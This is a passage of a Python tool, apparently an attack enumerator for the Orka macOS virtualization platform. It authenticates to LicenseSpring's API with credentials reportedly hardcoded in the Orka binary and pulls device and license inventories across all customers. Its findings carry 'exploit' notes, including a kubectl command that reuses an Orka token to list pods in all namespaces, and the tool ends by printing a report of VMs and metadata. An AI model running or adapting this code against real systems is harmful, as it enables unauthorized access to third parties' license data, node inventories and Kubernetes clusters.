                f'product_code: {LICENSESPRING_PRODUCT_CODE}\n'
                f'shared_key:   {LICENSESPRING_SHARED_KEY}'
            ),
            'exploit': (
                'SDK credentials enable: license activation for any hardware_id, '
                'check_license/ to retrieve bound hardware_ids (node inventory), '
                'enumerate activated Orka nodes across all customers.'
            ),
        })

        # Probe SDK API v1 (HMAC auth)
        date_str = datetime.now(timezone.utc).strftime('%a, %d %b %Y %H:%M:%S GMT')
        hmac_headers = {
            'Authorization': self._licensespring_hmac_auth(date_str),
            'Date': date_str,
            'Accept': 'application/json',
        }
        sdk_endpoints = {
            'product_details': f'/api/v4/product_details/?product={LICENSESPRING_PRODUCT_CODE}',
            'products_list':   '/api/v4/products/',
        }
        for key, ep in sdk_endpoints.items():
            sc, body, get_json = _http_get(f'{LICENSESPRING_API}{ep}', headers=hmac_headers, timeout=5)
            if sc == 200:
                result['sdk_auth_valid'] = True
                result[key] = get_json()

        # Probe Management API v4 (Basic auth)
        basic_headers = {
            'Authorization': self._licensespring_basic_auth(),
            'Accept': 'application/json',
        }
        mgmt_endpoints = {
            'mgmt_product': f'/api/v4/product_details/?product={LICENSESPRING_PRODUCT_CODE}',
            'mgmt_devices':  '/api/v4/device/?limit=100',
            'mgmt_licenses': '/api/v4/license/?limit=100',
        }
        for key, ep in mgmt_endpoints.items():
            sc, body, get_json = _http_get(f'{LICENSESPRING_API}{ep}', headers=basic_headers, timeout=5)
            if sc == 200:
                result['mgmt_auth_valid'] = True
                result[key] = get_json()

        if result['sdk_auth_valid'] or result['mgmt_auth_valid']:
            self.findings.append({
                'type': 'LicenseSpring API Auth Confirmed (HTTP 200)',
                'severity': 'CRITICAL',
                'description': 'Hardcoded credentials from Orka binary authenticate to LicenseSpring API',
                'detail': (
                    f"SDK auth: {result['sdk_auth_valid']} | "
                    f"Mgmt auth: {result['mgmt_auth_valid']} | "
                    f"Product: {result.get('product_details', {}).get('product_name', 'N/A')}"
                ),
                'exploit': (
                    'POST /api/v4/check_license/ with any ORKA_ENGINE_LICENSE_KEY value → '
                    'retrieve hardware_id (MLB serial) of the Mac node that activated it. '
                    'GET /api/v4/device/?limit=100 → full inventory of all activated Orka nodes.'
                ),
            })

        return result

    # ── Post-auth checks ──────────────────────────────────────────────────────

    def check_security_issues(self):
        """Post-auth security checks (requires valid token)."""
        if self.token:
            self.findings.append({
                'type': 'Orka Token = K8s Token',
                'severity': 'HIGH',
                'description': 'Orka tokens are K8s service account tokens (F4)',
                'detail': 'Valid token grants direct kubectl access to cluster',
                'exploit': (
                    f'kubectl --server={self.cluster_info.get("apiEndpoint", "https://API") if self.cluster_info else "https://API"} '
                    f'--token=<token> get pods --all-namespaces'
                ),
            })

    # ── Report ────────────────────────────────────────────────────────────────

    def report(self):
        """Generate human-readable report."""
        lines = []
        lines.append('=' * 60)
        lines.append('ORKA PLATFORM ENUMERATION')
        lines.append('=' * 60)

        lines.append(f'\nIn Orka VM:      {self.in_orka_vm}')
        lines.append(f'On Orka Node:    {self.on_orka_node}')
        lines.append(f'API Reachable:   {self.orka_api_reachable}')
        lines.append(f'Authenticated:   {bool(self.token)}')

        if self.metadata_server:
            keys = self.metadata_server.get('keys', [])
            lines.append(f'\nMetadata Server: {len(keys)} keys')
            for k in keys[:10]:
                lines.append(f'  {k}: {self.metadata_server["metadata"].get(k, "")[:60]}')

        if self.cluster_info:
            lines.append(f'\nCluster Info (unauthenticated):')
            lines.append(f'  K8s API: {self.cluster_info.get("apiEndpoint", "N/A")}')
            lines.append(f'  OAuth:   {self.cluster_info.get("baseOauthEndpoint", "N/A")}')

        if self.vms:
            lines.append(f'\nVMs ({len(self.vms)}):')
            for vm in self.vms[:10]:
                lines.append(
                    f'  {vm["name"]} | {vm["ip"]}:{vm.get("ssh_port", 8822)} '
                    f'| {vm["status"]}'
                )

        if self.images:
            lines.append(f'\nImages: {len(self.images)}')

        if self.findings:
            crit  = [f for f in self.findings if f['severity'] == 'CRITICAL']
            high  = [f for f in self.findings if f['severity'] == 'HIGH']
            other = [f for f in self.findings if f['severity'] not in ('CRITICAL', 'HIGH')]

            lines.append(f'\nFindings: {len(self.findings)} total '
                         f'({len(crit)} CRITICAL, {len(high)} HIGH, {len(other)} other)')
            for f in (crit + high + other):
                lines.append(f'\n  [{f["severity"]}] {f["type"]}')
                lines.append(f'  {f["description"]}')
                if 'detail' in f:
                    for detail_line in f['detail'].splitlines():
                        lines.append(f'    {detail_line}')
                if 'exploit' in f:
                    lines.append(f'  EXPLOIT: {f["exploit"][:120]}')

        return '\n'.join(lines)


if __name__ == '__main__':
    enum = OrkaEnumerator()
    enum.enumerate_all()
    print(enum.report())
